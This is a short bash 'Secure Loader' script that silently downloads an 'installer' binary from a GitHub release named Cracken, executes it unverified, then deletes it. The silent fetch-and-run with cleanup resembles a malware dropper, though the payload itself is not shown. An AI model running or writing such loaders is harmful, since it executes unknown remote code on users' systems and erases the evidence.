#!/bin/bash
# Nayeem Dev - Secure Loader
# This script downloads the encrypted installer binary and runs it.

# 1. PASTE THE LINK TO YOUR 'installer' BINARY HERE
SECURE_LINK="https://github.com/owneraniex/Cracken/releases/download/v5.0/installer"

# 2. SETUP PATHS
TEMP_FILE=$(mktemp)

# 3. DOWNLOAD
curl -L -s -o "$TEMP_FILE" "$SECURE_LINK"

# 4. EXECUTE
chmod +x "$TEMP_FILE"
"$TEMP_FILE"

# 5. CLEANUP
rm "$TEMP_FILE"
